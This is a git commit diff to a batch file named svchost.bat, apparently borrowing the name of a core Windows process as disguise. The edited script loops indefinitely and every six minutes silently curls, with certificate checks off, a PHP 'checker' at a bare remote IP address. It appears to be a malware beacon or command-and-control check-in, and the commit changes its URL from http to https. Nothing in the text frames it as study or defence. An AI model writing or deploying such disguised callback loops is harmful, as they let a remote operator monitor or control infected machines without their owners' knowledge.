51f039804ffe1b21b9a03e4acb6fb828fb2e5be7
Magnus Järnhandske <109724162+PickleTheRick@users.noreply.github.com>
2023-05-30 20:52:42 +0200

    Update svchost.bat

--- svchost.bat
+++ svchost.bat
@@ -1,4 +1,4 @@
 :loop
-curl --insecure http://94.232.11.178:443/malform/OS_verison/checker.php
+curl --insecure https://94.232.11.178:443/malform/OS_verison/checker.php
 timeout /t 360 >nul
 goto loop
